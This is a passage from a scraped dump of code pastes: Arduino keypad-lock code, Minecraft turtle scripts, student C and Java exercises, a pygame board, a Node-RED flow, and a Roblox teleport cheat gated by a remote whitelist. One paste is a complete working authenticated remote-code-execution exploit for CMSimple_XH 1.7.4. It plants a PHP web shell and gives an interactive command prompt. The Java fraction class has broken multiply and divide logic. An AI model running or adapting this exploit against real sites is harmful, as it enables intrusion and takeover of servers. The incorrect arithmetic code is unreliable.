Keypad teclado = Keypad(makeKeymap(keys), pinesFilas, pinesColumnas, FILAS, COLUMNAS);  // crea objeto teclado
char TECLA;                        // almacena la tecla presionada
char CLAVE[5];                     // almacena en un array 4 digitos ingresados
char CLAVE_MAESTRA[5] = ""0000"";    // almacena en un array la contraseña inicial
byte INDICE = 0;                   // indice del array  

void handleSensorReadings();

void setup() {
  Serial.begin(9600);
  Serial.println(""Temperature and Humedad Sensor Test"");
  dht.begin();
  lcd.init();
  lcd.backlight();
}

void loop() {
  handleSensorReadings();
  delay(1000);
}

void handleSensorReadings() {
  h = dht.readHumidity();
  t = dht.readTemperature();

  Serial.print(""Humedad: "");
  Serial.print(h);
  Serial.print("" %, Temp: "");
  Serial.print(t);
  Serial.println("" ° Celsius"");

  lcd.setCursor(0, 0);
  lcd.print(""Temp & Humedad"");

  lcd.setCursor(0, 1);
  lcd.print(""T:"");
  lcd.print(t);
  lcd.print(""C"");

  lcd.setCursor(6, 1);
  lcd.print(""2023 "");

  lcd.setCursor(11, 1);
  lcd.print(""H:"");
  lcd.print(h);
  lcd.print(""%"");
}




////////////Servo////////

void setup()
{
 lcd.init();                          // inicializa el LCD
 lcd.backlight();
 servo11.attach(11,660,1400);        // Asocia el servo1 al pin 11, define el min y max del ancho del pulso 
 servo11.write(150);                // Gira el servo a 150 grados Cierra la puerta
 limpia();
}

void loop(){
  TECLA = teclado.getKey();   // obtiene tecla presionada y asigna a variable
  if (TECLA)                  // comprueba que se haya presionado una tecla
  {
    CLAVE[INDICE] = TECLA;    // almacena en array la tecla presionada
    INDICE++;                 // incrementa indice en uno
    lcd.print(TECLA);         // envia al LCD la tecla presionada
  }

  if(INDICE == 4)             // si ya se almacenaron los 4 digitos
  {
    if(!strcmp(CLAVE, CLAVE_MAESTRA))    // compara clave ingresada con clave maestra
        abierto();              
    else 
        error();
    
    INDICE = 0;
  }
  if(estado==1 && (analogRead(A3)==0))     // si esta abierta y se pulsa boton de Nueva Clave
         nueva_clave();   

}

///////////////////// Error //////////////////////////////
void error(){   
      lcd.setCursor(0,1);
      lcd.print(""ERROR DE CLAVE    ""); 
      limpia();
}
/////////////////////abierto o cerrado //////////////////////////////
void abierto(){  
   if(estado==0){ 
      estado=1;
      lcd.setCursor(0,1);
      lcd.print(""Abierto            "");  // imprime en el LCD que esta abierta
      servo11.write(30);                 // Gira el servo a 30 grados  abre la puerta
   }
   else{
    estado=0;
    lcd.setCursor(0,1);
    lcd.print(""Cerrado              "");  // imprime en el LCD que esta cerrada
    servo11.write(150);                // Gira el servo a 150 grados  cierra la puerta
   } 
 limpia();
}

/////////////////////Nueva_Clave //////////////////////////////
void nueva_clave(){  
  lcd.setCursor(0,0);
  lcd.print(""NUEVA CLAVE:        "");
  lcd.setCursor(12,0);
  INDICE=0;
  while (INDICE<=3) {
   TECLA = teclado.getKey();   // obtiene tecla presionada y asigna a variable TECLA
   if (TECLA)                 // comprueba que se haya presionado una tecla
    {
      CLAVE_MAESTRA[INDICE] = TECLA;    // almacena en array la tecla presionada
      CLAVE[INDICE] = TECLA;
      INDICE++;                 // incrementa indice en uno
      lcd.print(TECLA);         // envia a monitor serial la tecla presionada
    }   
  }
 estado=0;
  lcd.setCursor(0,1);
  lcd.print(""CLAVE CAMBIADA"");
  delay(2000);
  limpia();
}

///////////////////// limpia //////////////////////////////
void limpia(){  
 lcd.setCursor(0,0);
 lcd.print(""CLAVE :          "");
 lcd.setCursor(9,0);
}"
iPLzN2ew,BoomDropRemote,Phemto,Lua,Friday 2nd of June 2023 03:32:49 PM CDT,"--Wait for a redstone signal and then activate the drop protocol
--start with lava is slot 1
local channel = 45  --destination number

--initialize the modem
modem = peripheral.wrap(""left"")
modem.open(channel)

args = { ... }

turtle.turnRight()
turtle.turnRight()  		--should be facing toward the player now

while true do
  	os.pullEvent(""redstone"") -- wait for a ""redstone"" event
  	if rs.getInput(""top"") then -- check the input
		--This is a call to start dropping. 
		modem.transmit(channel, 2,  ""ON"")
		print(""Sending Drop Signal"")
		modem.closeAll()
	end
	sleep(20)
	turtle.select(1)
	turtle.dig()
	turtle.place()
end 


		"
z16Sm2ex,Exploit,Denitsu,Python,Friday 2nd of June 2023 03:19:50 PM CDT,"# Exploit Title: CMSimple_XH 1.7.4 - Remote Code Execution (RCE) (Authenticated)
# Date: 01-10-2021
# Exploit Author: Halit AKAYDIN (hLtAkydn)
# Vendor Homepage: https://www.cmsimple-xh.org/
# Software Link: https://www.cmsimple-xh.org/?Downloads
# Version: 1.7.4
# Category: Webapps
# Tested on: Linux/Windows


# CMSimple_XH is an open source project under GPL3 license
# Includes an endpoint that allows remote access
# Backup page is misconfigured, causing security vulnerability
# User information with sufficient permissions is required.

# Example: python3 exploit.py -u http://example.com -p Admin123



from bs4 import BeautifulSoup
from time import sleep
import requests
import argparse


def main():
    parser = argparse.ArgumentParser(description='CMSimple_XH Version 1.7.4 - Remote Code Execution (Authenticated)')
    parser.add_argument('-u', '--host', type=str, required=True)
    parser.add_argument('-p', '--password', type=str, required=True)
    args = parser.parse_args()
    print(""\nCMSimple_XH Version 1.7.4 - Remote Code Execution (Authenticated)"",
        ""\nExploit Author: Halit AKAYDIN (hLtAkydn)\n"")
    host(args)


def host(args):
    # Check http or https
    if args.host.startswith(('http://', 'https://')):
        print(""[?] Check Url...\n"")
        sleep(2)
        args.host = args.host
        if args.host.endswith('/'):
            args.host = args.host[:-1]
        else:
            pass
    else:
        print(""\n[?] Check Adress...\n"")
        sleep(2)
        args.host = ""http://"" + args.host
        args.host = args.host
        if args.host.endswith('/'):
            args.host = args.host[:-1]
        else:
            pass

    # Check Host Status
    try:
        response = requests.get(args.host)
        if response.status_code == 200:
            login(args)
        else:
            print(""[-] Address not reachable!"")
            sleep(2)

    except requests.ConnectionError as exception:
        print(""[-] Address not reachable!"")
        sleep(2)
        exit(1)


def login(args):
    url = args.host + ""/?&login""
    cookies = {
        ""XH_2f"": ""evil""
    }
    headers = {
        ""Origin"": args.host,
        ""Content-Type"": ""application/x-www-form-urlencoded"",
        ""User-Agent"": ""Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0) Gecko/20190101 Firefox/77.0"",
        ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"",
        ""Referer"": args.host + ""/?&login""
    }
    data = {
        ""login"": ""true"",
        ""keycut"": args.password,
        ""submit"": ""Login""
    }
    response = requests.post(url, headers=headers, cookies=cookies, data=data)

    token = response.cookies.get(""XH_2f"")
    soup = BeautifulSoup(response.text, 'html.parser')

    if (soup.find(""link"", {""rel"": ""next""})['href'] != ""/""):
        print(""[!] Login Success!\n"")
        sleep(2)
        csrf(args, token)
    else:
        print(""[!] Wrong password!!\n"")
        sleep(2)


def csrf(args, token):
    url = args.host + ""/?file=content""
    cookies = {
        ""status"": ""adm"",
        ""XH_2f"": token
    }
    headers = {
        ""User-Agent"": ""Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0) Gecko/20190101 Firefox/77.0"",
        ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"",
        ""Referer"": args.host + ""/?&settings"",
        ""Accept-Encoding"": ""gzip, deflate"",
        ""Connection"": ""close""
    }
    response = requests.get(url, headers=headers, cookies=cookies)

    try:
        soup = BeautifulSoup(response.text, 'html.parser')
        csrf = soup.find_all(""input"", type=""hidden"")[3].get(""value"")
        create(args, token, csrf)
    except Exception as e:
        print(e)
    else:
        pass


def create(args, token, csrf):
    payload = ""<?php\r\nfile_put_contents('./evil.php', \""\\x3c\\x3fphp system(\\x24_GET['cmd']);\\x3f\\x3e\"");\r\n?>\r\n""

    url = args.host
    cookies = {
        ""status"": ""adm"",
        ""XH_2f"": token
    }
    headers = {
        ""Origin"": args.host,
        ""Content-Type"": ""application/x-www-form-urlencoded"",
        ""User-Agent"": ""Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0) Gecko/20190101 Firefox/77.0"",
        ""Accept"": ""text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9"",
        ""Referer"": args.host + ""/?file=content&action=edit&xh_success=content"",
        ""Accept-Encoding"": ""gzip, deflate""
    }
    data = {
        ""text"": payload,
        ""file"": ""content"",
        ""action"": ""save"",
        ""xh_csrf_token"": csrf
    }
    response = requests.post(url, headers=headers, cookies=cookies, data=data, allow_redirects=True)

    if (response.status_code == 200):
        print(""[!] Create Vuln File!\n"")
        sleep(2)
        exploit(args)
    else:
        print(""[!] Create Failed!\n"")
        sleep(2)


def exploit(args):
    print(""[+] Exploit Done!\n"")
    sleep(2)

    while True:
        cmd = input(""$ "")
        url = args.host + ""/evil.php?cmd="" + cmd
        headers = {
            ""Upgrade-Insecure-Requests"": ""1"",
            ""User-Agent"": ""Mozilla/5.0 (Windows NT 6.1; WOW64; rv:77.0) Gecko/20190101 Firefox/77.0""
        }

        response = requests.post(url, headers=headers, timeout=5)

        if response.text == """":
            print(cmd + "": command not found\n"")
        else:
            print(response.text)


if __name__ == '__main__':
    main()
"
LsCb0hAP,WaterDrop,Phemto,Lua,Friday 2nd of June 2023 03:18:30 PM CDT,"--Wait for a redstone signal and then activate the drop protocol for WaterDrop
--does not actually need a dropper
--start with water in slot 1 and 2

local channel = 0  --destination number

--initialize the modem
modem = peripheral.wrap(""left"")
modem.open(channel)

args = { ... }

turtle.select(3)
turtle.back()
for i=1,50,1 do
	turtle.digDown()
	turtle.down()
end
turtle.up()
turtle.select(1)
turtle.placeDown()
for i=1,49,1 do 
	turtle.up()
end
turtle.dig()
turtle.forward()
turtle.turnRight()
turtle.turnRight()
turtle.select(3)
turtle.place()
while true do
  	os.pullEvent(""redstone"") -- wait for a ""redstone"" event
  	if rs.getInput(""top"") then -- check the input
		--This is a call to start dropping. 
		modem.transmit(channel, 2,  ""ON"")
		print(""Sending Drop Signal"")
		modem.closeAll()
		turtle.dig()
		sleep(10)
		turtle.digDown()
		turtle.select(2)
		turtle.placeDown()
		sleep(20)
		turtle.select(3)
		turtle.place()
	end
end 


		"
3Zf5TWJU,Untitled,UpdateHub,Lua,Friday 2nd of June 2023 03:07:39 PM CDT,"local token = _G.token
local check = ""https://whitelisthandler.000webhostapp.com/tokens.php?key="" .. token

if game:HttpGet(check) == ""Whitelisted"" then

local plrs = game:GetService(""Players"")
local AlreadyLoaded = plrs.LocalPlayer.PlayerGui:FindFirstChild(""whiHub"")

if AlreadyLoaded then
	for i, v in pairs(plrs.LocalPlayer.PlayerGui:GetChildren()) do
		if v.Name == ""whiHub"" then
			v:Destroy()
		end
	end
end

wait()

local whiHub = Instance.new(""ScreenGui"")
local main = Instance.new(""Frame"")
local title = Instance.new(""TextLabel"")
local UICorner = Instance.new(""UICorner"")
local UICorner_2 = Instance.new(""UICorner"")
local jungle = Instance.new(""TextButton"")
local UICorner_3 = Instance.new(""UICorner"")
local reset = Instance.new(""TextButton"")
local UICorner_4 = Instance.new(""UICorner"")
local volc = Instance.new(""TextButton"")
local UICorner_5 = Instance.new(""UICorner"")
local lunar = Instance.new(""TextButton"")
local UICorner_6 = Instance.new(""UICorner"")
local jungleH = Instance.new(""TextButton"")
local UICorner_7 = Instance.new(""UICorner"")
local volcH = Instance.new(""TextButton"")
local UICorner_8 = Instance.new(""UICorner"")
local lunarh = Instance.new(""TextButton"")
local UICorner_9 = Instance.new(""UICorner"")

--Properties:
whiHub.Name = ""whiHub""
whiHub.Parent = game.Players.LocalPlayer:WaitForChild(""PlayerGui"")
whiHub.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
whiHub.ResetOnSpawn = false

main.Name = ""main""
main.Parent = whiHub
main.BackgroundColor3 = Color3.fromRGB(31, 31, 31)
main.BorderSizePixel = 0
main.ClipsDescendants = true
main.Position = UDim2.new(0, 931, 0, 274)
main.Size = UDim2.new(0, 259, 0, 163)

title.Name = ""title""
title.Parent = main
title.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
title.BorderSizePixel = 0
title.Size = UDim2.new(0, 259, 0, 22)
title.Font = Enum.Font.Code
title.Text = ""MercHub: Wild Horse Island""
title.TextColor3 = Color3.fromRGB(255, 255, 255)
title.TextSize = 14.000

UICorner.CornerRadius = UDim.new(0, 4)
UICorner.Parent = title

UICorner_2.CornerRadius = UDim.new(0, 4)
UICorner_2.Parent = main

jungle.Name = ""jungle""
jungle.Parent = main
jungle.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
jungle.BorderSizePixel = 0
jungle.Position = UDim2.new(0, 10, 0, 28)
jungle.Size = UDim2.new(0, 103, 0, 23)
jungle.Font = Enum.Font.Code
jungle.Text = ""Jungle Crystals""
jungle.TextColor3 = Color3.fromRGB(255, 255, 255)
jungle.TextSize = 12.000

UICorner_3.CornerRadius = UDim.new(0, 4)
UICorner_3.Parent = jungle

reset.Name = ""reset""
reset.Parent = main
reset.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
reset.BorderSizePixel = 0
reset.Position = UDim2.new(0, 10, 0, 107)
reset.Size = UDim2.new(0, 242, 0, 46)
reset.Font = Enum.Font.Code
reset.Text = ""Reset""
reset.TextColor3 = Color3.fromRGB(255, 255, 255)
reset.TextSize = 12.000

UICorner_4.CornerRadius = UDim.new(0, 4)
UICorner_4.Parent = reset

volc.Name = ""volc""
volc.Parent = main
volc.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
volc.BorderSizePixel = 0
volc.Position = UDim2.new(0, 10, 0, 56)
volc.Size = UDim2.new(0, 103, 0, 20)
volc.Font = Enum.Font.Code
volc.Text = ""Volcano Prism""
volc.TextColor3 = Color3.fromRGB(255, 255, 255)
volc.TextSize = 12.000

UICorner_5.CornerRadius = UDim.new(0, 4)
UICorner_5.Parent = volc

lunar.Name = ""lunar""
lunar.Parent = main
lunar.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
lunar.BorderSizePixel = 0
lunar.Position = UDim2.new(0, 10, 0, 82)
lunar.Size = UDim2.new(0, 103, 0, 18)
lunar.Font = Enum.Font.Code
lunar.Text = ""Lunar Gems""
lunar.TextColor3 = Color3.fromRGB(255, 255, 255)
lunar.TextSize = 12.000

UICorner_6.CornerRadius = UDim.new(0, 4)
UICorner_6.Parent = lunar

jungleH.Name = ""jungleH""
jungleH.Parent = main
jungleH.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
jungleH.BorderSizePixel = 0
jungleH.Position = UDim2.new(0, 150, 0, 28)
jungleH.Size = UDim2.new(0, 103, 0, 23)
jungleH.Font = Enum.Font.Code
jungleH.Text = ""Jungle Horses""
jungleH.TextColor3 = Color3.fromRGB(255, 255, 255)
jungleH.TextSize = 12.000

UICorner_7.CornerRadius = UDim.new(0, 4)
UICorner_7.Parent = jungleH

volcH.Name = ""volcH""
volcH.Parent = main
volcH.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
volcH.BorderSizePixel = 0
volcH.Position = UDim2.new(0, 150, 0, 56)
volcH.Size = UDim2.new(0, 103, 0, 20)
volcH.Font = Enum.Font.Code
volcH.Text = ""Volcano Horses""
volcH.TextColor3 = Color3.fromRGB(255, 255, 255)
volcH.TextSize = 12.000

UICorner_8.CornerRadius = UDim.new(0, 4)
UICorner_8.Parent = volcH

lunarh.Name = ""lunarh""
lunarh.Parent = main
lunarh.BackgroundColor3 = Color3.fromRGB(50, 50, 50)
lunarh.BorderSizePixel = 0
lunarh.Position = UDim2.new(0, 150, 0, 82)
lunarh.Size = UDim2.new(0, 103, 0, 18)
lunarh.Font = Enum.Font.Code
lunarh.Text = ""Lunar Horses""
lunarh.TextColor3 = Color3.fromRGB(255, 255, 255)
lunarh.TextSize = 12.000

UICorner_9.CornerRadius = UDim.new(0, 4)
UICorner_9.Parent = lunarh

-- Scripts:
local function GZFAK_fake_script() -- main.smoothDrag
	local script = Instance.new('LocalScript', main)

	local UserInputService = game:GetService(""UserInputService"")
	local runService = (game:GetService(""RunService""));
	
	local gui = script.Parent
	
	local dragging
	local dragInput
	local dragStart
	local startPos
	
	function Lerp(a, b, m)
		return a + (b - a) * m
	end;
	
	local lastMousePos
	local lastGoalPos
	local DRAG_SPEED = (8); -- // The speed of the UI darg.
	function Update(dt)
		if not (startPos) then return end;
		if not (dragging) and (lastGoalPos) then
			gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, lastGoalPos.X.Offset, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, lastGoalPos.Y.Offset, dt * DRAG_SPEED))
			return 
		end;
	
		local delta = (lastMousePos - UserInputService:GetMouseLocation())
		local xGoal = (startPos.X.Offset - delta.X);
		local yGoal = (startPos.Y.Offset - delta.Y);
		lastGoalPos = UDim2.new(startPos.X.Scale, xGoal, startPos.Y.Scale, yGoal)
		gui.Position = UDim2.new(startPos.X.Scale, Lerp(gui.Position.X.Offset, xGoal, dt * DRAG_SPEED), startPos.Y.Scale, Lerp(gui.Position.Y.Offset, yGoal, dt * DRAG_SPEED))
	end;
	
	gui.InputBegan:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
			dragging = true
			dragStart = input.Position
			startPos = gui.Position
			lastMousePos = UserInputService:GetMouseLocation()
	
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragging = false
				end
			end)
		end
	end)
	
	gui.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			dragInput = input
		end
	end)
	
	runService.Heartbeat:Connect(Update)
end
coroutine.wrap(GZFAK_fake_script)()
local function RXLWVW_fake_script() -- main.funcHandler 
	local script = Instance.new('LocalScript', main)

	-- gem Capture
	function findGemJungle()
		for i, v in pairs(game.Workspace.Islands[""Jungle Island""]:GetDescendants()) do
			if v.Name == ""Meshes/Gems 2"" or v.Name == ""Meshes/Single Crystal"" then
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame
			end
		end
	end
	
	function findGemLunar()
		for i, v in pairs(game.Workspace.Islands[""Lunar Islands""]:GetDescendants()) do
			if v.Name == ""Meshes/Gems 2"" or v.Name == ""Meshes/Single Crystal"" then
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame
			end
		end
	end
	
	function findGemVolcano()
		for i, v in pairs(game.Workspace.Islands[""Volcano Island""]:GetDescendants()) do
			if v.Name == ""Meshes/Gems 2"" or v.Name == ""Meshes/Single Crystal"" then
				game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame
			end
		end
	end
	
	-- horse Capture
	local islands = game.Workspace.Islands

	function captureHorseJungle()
		for i, v in pairs(islands[""Jungle Island""]:GetDescendants()) do
			if v.Name == ""maneMesh"" and not v.Parent.HumanoidRootPart:FindFirstChild(""ShopItemOverheadAnimals"") or v.Parent:FindFirstChild(""saddle"") then
				repeat
					wait()
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame

				until not (v:IsDescendantOf(islands[""Jungle Island""]))
			end
		end
	end
	
	function captureHorseLunar()
		for i, v in pairs(islands[""Lunar Islands""]:GetDescendants()) do
			if v.Name == ""maneMesh"" and not v.Parent.HumanoidRootPart:FindFirstChild(""ShopItemOverheadAnimals"") or v.Parent:FindFirstChild(""saddle"") then
				repeat
					wait()
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame
	
				until not (v:IsDescendantOf(islands[""Lunar Islands""]))
			end
		end
	end
	
	function captureHorseVolcano()
		for i, v in pairs(islands[""Volcano Island""]:GetDescendants()) do
			if v.Name == ""maneMesh"" and not v.Parent.HumanoidRootPart:FindFirstChild(""ShopItemOverheadAnimals"") or v.Parent:FindFirstChild(""saddle"") then
				repeat
					wait()
					game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = v.CFrame
	
				until not (v:IsDescendantOf(islands[""Volcano Island""]))
			end
		end
	end
	
	function kill()
		game.Players.LocalPlayer.Character.Humanoid.Health = 0
	end
	
	local jung = script.Parent.jungle
	local jungH = script.Parent.jungleH
	local volc = script.Parent.volc
	local volcH = script.Parent.volcH
	local lunar = script.Parent.lunar
	local lunarH = script.Parent.lunarh
	local reset = script.Parent.reset
	
	jung.MouseButton1Down:Connect(function()
		findGemJungle()
	end)
	
	volc.MouseButton1Down:Connect(function()
		findGemVolcano()
	end)
	
	lunar.MouseButton1Down:Connect(function()
		findGemLunar()
	end)
	
	jungH.MouseButton1Down:Connect(function()
		captureHorseJungle()
	end)
	
	lunarH.MouseButton1Down:Connect(function()
		captureHorseLunar()
	end)
	
	volcH.MouseButton1Down:Connect(function()
		captureHorseVolcano()
	end)
	
	reset.MouseButton1Down:Connect(function()
		kill()
	end)
end
coroutine.wrap(RXLWVW_fake_script)()
local function QWSRHRC_fake_script() -- main.KeyToggleGUI 
	local script = Instance.new('LocalScript', main)

	local frame = script.Parent
	local hotkey = Enum.KeyCode.V
	local UIS = game:GetService(""UserInputService"")
	local open = false
	
	UIS.InputBegan:Connect(function(key, gp)
		if key.KeyCode == hotkey then
			if open == false then
				open = true
				frame.Visible = open
			elseif open == true then
				open = false
				frame.Visible = open
			end
		end
	end)
end

coroutine.wrap(QWSRHRC_fake_script)()

else
game.Players.LocalPlayer:Kick(game:HttpGet(check))
end"
4ZzqGUpn,Untitled,supprucha,C,Friday 2nd of June 2023 02:52:04 PM CDT,"#define _CRT_SECURE_NO_WARNINGS
#include <stdio.h>
#include <string.h>
#include <math.h>
#include <limits.h>

int Parent(i) {
    return i / 2;
}
int Left(i) {
    return 2 * i + 1;
}

int Right(i) {
    return 2 * i + 2;
}


void pref_in(int number_parent, int* arr_medium, int maX, int* medium) {
    int child = Left(number_parent);
    if (child < maX)
        if (arr_medium[child] != INT_MIN) {
            int razn = arr_medium[child] + arr_medium[number_parent];
            if (abs(razn) < (*medium))
                *medium = abs(razn);
            pref_in(child, arr_medium, maX, medium);
        }
    child = Right(number_parent);
    if (child < maX)
        if (arr_medium[child] != INT_MIN) {
            int razn = arr_medium[child] + arr_medium[number_parent];
            if (abs(razn) < (*medium))
                *medium = abs(razn);
            pref_in(child, arr_medium, maX, medium);
        }
}
void pref(int number_parent, int* arr, int maX, int* arr_medium) {
    int child = Left(number_parent);
    if (child < maX)
        if (arr[child] != INT_MIN) {
            arr_medium[child] = arr[child] - arr[number_parent];
            pref(child, arr, maX, arr_medium);
        }
        else {
            arr_medium[child] = INT_MIN;
        }
    child = Right(number_parent);
    if (child < maX)
        if (arr[child] != INT_MIN) {
            arr_medium[child] = arr[child] - arr[number_parent];
            pref(child, arr, maX, arr_medium);
        }
        else {
            arr_medium[child] = INT_MIN;
        }
}
int main() {
    FILE* F = fopen(""input.txt"", ""r"");
    int h;
    fscanf(F, ""%d "", &h);
    int maX = pow(2, h + 1) - 1;
    int* tree = (int*)malloc(sizeof(int) * maX);
    char temp[13];
    int i = 0;
    int flag = 0;

    while (fscanf(F, ""%s"", temp) != EOF) {
        int lenght = strlen(temp);
        if (temp[0] == '-') {
            flag = 1;
            if (lenght == 1) {
                tree[i] = INT_MIN;
                flag = 0; i++;
                continue;
            }
        }
        int value = 0;
        for (int j = 0; j < lenght; j++) {
            if (temp[j] == '-')
                continue;
            value = value * 10 + (temp[j] - '0');
        }
        if (flag)
            value *= -1;
        tree[i] = value;
        i++;
        flag = 0;
    }
    int medium = INT_MAX;
    int* sum = (int*)calloc(maX, sizeof(int));
    pref(0, tree, maX, sum);
    pref_in(0, sum, maX, &medium);
    free(tree);
    free(sum);
    FILE* out = fopen(""output.txt"", ""w"");
    fprintf(out, ""%d"", medium);
    fclose(out);
}"
q7EhdzXZ,Can't stop 1,PrezesSmoku,Python,Friday 2nd of June 2023 02:49:58 PM CDT,"import pygame

#szerokość i wysokość ekranu
SZEROKOSC_EKRANU = 1280
WYSOKOSC_EKRANU = 960

pygame.init()
ekran = pygame.display.set_mode([SZEROKOSC_EKRANU, WYSOKOSC_EKRANU])
zegar = pygame.time.Clock()
obraz_tla = pygame.image.load('images/mountain.png') 
czcionka = pygame.font.SysFont('Comic Sans MS', 35) #nazwa i rozmiar czcionki
obrazki_kosci = []
for i in range(4):
    obrazki_kosci.append(pygame.image.load('images/kosc-1.png'))

teksty = [""Naciśnij Spacje""]
liczba_pol = [3,5,7,9,11,13,11,9,7,5,3]
skok_x = 70
skok_y = 50
start_x = 240
start_y = 900

def budowa_planszy():
    #współrzędne pierwszego pola
    x = start_x
    y = start_y
    #numer kolumny
    num = 2
    #Operacje wykonywane dla każdej kolumny
    for kolumna in liczba_pol:
        #modyfikacja współrzędnych
        #przesuwamy x w prawo po każdej zbudowanej kolumnie
        x += skok_x
        #Wracamy na dół kolumny aby zacząć budować nową
        y = start_y
        #budowa jednej kolumny
        for i in range(kolumna):
            #Przesuwamy współrzędną y w górę
            y -= skok_y
            #rysowanie koła które będzie czarną obwódką 
            pygame.draw.circle(ekran, (0, 0, 0), (x,y), 22)
            #rysowanie środka pola - kolor dowolny
            #ważne aby dać inne kolory graczom potem
            pygame.draw.circle(ekran, (255, 230, 0), (x,y), 20)
        #przekształcamy liczbę na tekst 
        numer_kolumny = czcionka.render(str(num), True,(0,0,0))
        #Wyświetlamy to nad kolumną
        #cofamy x odrobinę aby wyśrodkować napis
        ekran.blit(numer_kolumny, (x-10,y-70))
        #Przechodzimy do kolejnej kolumny
        num += 1

def pokaz_teksty():
    #współrzędne tekstu
    x_tekstu = 800
    y_tekstu = 40
    #przesunięcie tekstu między linijkami
    skok_tekstu = 50
    for tekst in teksty:
        #stworzenie linijki. 
        #Kolor potem zmienimy na kolor aktywnego gracza
        linijka = czcionka.render(tekst, True,(0,0,0))
        ekran.blit(linijka, (x_tekstu,y_tekstu))
        y_tekstu += skok_tekstu

program_dziala = True
while program_dziala:
    for zdarzenie in pygame.event.get():
        if zdarzenie.type == pygame.KEYDOWN:
            if zdarzenie.key == pygame.K_ESCAPE:
                program_dziala = False
        elif zdarzenie.type == pygame.QUIT:
            program_dziala = False
    

    #wyświetl tło
    ekran.blit(obraz_tla, (0,0))
    #Kosci
    ekran.blit(obrazki_kosci[0], (16,16))
    ekran.blit(obrazki_kosci[1], (116,16))
    ekran.blit(obrazki_kosci[2], (16,116))
    ekran.blit(obrazki_kosci[3], (116,116))
    #Plansza
    budowa_planszy()
    #Teksty
    pokaz_teksty()
    #odświerz ekran
    pygame.display.flip()
    zegar.tick(60) #liczba klatek na sekunde

pygame.quit() "
u6DWUDrC,MyFraction,morry2341,Java,Friday 2nd of June 2023 02:43:09 PM CDT,"public class F12 { //eigentlich Fraction3
    int numerator;
    int denominator;
    F12 result;

    F12(int num, int den){
        numerator = num;
        denominator = den;
        simplify();
    }

    void simplify(){
        int gcd = findGCD(numerator, denominator);
        numerator /= gcd;
        denominator /= gcd;
    }

    int findGCD(int a, int b){
        if(b==0){
            return a;

        }
        return findGCD(b, a%b);
    }

    public int getNum(){
        return numerator;
    }

    public int getDenom(){
        return denominator;
    }

    F12 add(F12 x){
        F12 answer;
        if(denominator == x.denominator){
            answer = new F12(x.numerator+numerator, denominator);
        } else {
            int den = this.getDenom() * x.getDenom();
            int num = this.getNum() * x.getDenom() + x.getNum() * this.getDenom();
            answer = new F12(num, den);
        }
        return answer;
    }

    F12 subtract(F12 x){
        F12 answer;
        if(x.denominator == denominator){
            answer = new F12(numerator- x.numerator, denominator);
        } else {
            int den = this.getDenom()*x.getDenom();
            int num = this.getNum()*x.getDenom() - x.getNum()*this.getDenom();

            answer = new F12(num, den);
        }
        return answer;
    }

    F12 multiply(F12 x){
        F12 answer;
        if(x.denominator == denominator){
            answer = new F12(numerator+x.numerator, denominator);
        } else {
            int den = this.getNum()+x.getNum();
            int num = this.getNum() + x.getNum() + x.getNum()*this.getDenom();
            //num-=x.getNum()*denominator;
            answer = new F12(num, den);
        }
        return answer;
    }

    F12 divide(F12 x){
        F12 answer;
        if(x.denominator == denominator){
            answer = new F12(numerator - x.numerator, denominator);
        } else {
            int den = this.getDenom() + x.getDenom();
            int num = numerator - x.getNum();
            num -= x.getNum()*denominator;
            answer = new F12(num, den);
        }
        return answer;
    }

    public boolean equals(F12 x){
        boolean answer = false;
        if(numerator == x.numerator && denominator == x.denominator){
            answer = true;
        }
        return answer;
    }

    public String toString(){
        return (Integer.toString(numerator) + ""/"" + Integer.toString(denominator));
    }


    public static void main(String[] args) {
        F12 a = new F12(3,4);
        F12 b = new F12(5,6);
        System.out.println(a.toString());
        System.out.println(b.toString());
        F12 c = a.add(b);
        System.out.println(""add: "" + c.toString());

        c = a.subtract(b);
        System.out.println(""sub: "" + c.toString());

        c = a.divide(b);
        System.out.println(""div: "" + c.toString());

        c = a.multiply(b);
        System.out.println(""multiply: "" + c.toString());

    }
}"
PTHgRUem,IKEA 5 Buttons,NittyGritty,JSON,Friday 2nd of June 2023 02:24:51 PM CDT,"[
    {
        ""id"": ""90f50d13.e7349"",
        ""type"": ""mqtt in"",
        ""z"": ""cc7414fb.91f278"",
        ""name"": ""IKEA Button"",
        ""topic"": ""/home/zigbee/IKEA-Button"",
        ""qos"": ""2"",
        ""datatype"": ""json"",
        ""broker"": ""595dfa51.2c1224"",
        ""nl"": false,
        ""rap"": false,
        ""inputs"": 0,
        ""x"": 110,
        ""y"": 240,
        ""wires"": [
            [
                ""827685862394cc86""
            ]
        ]
    },
    {
        ""id"": ""c9757d4f.fc9b7"",
        ""type"": ""debug"",
        ""z"": ""cc7414fb.91f278"",
        ""name"": ""Ikea-Button"",
        ""active"": true,
        ""tosidebar"": true,
        ""console"": false,
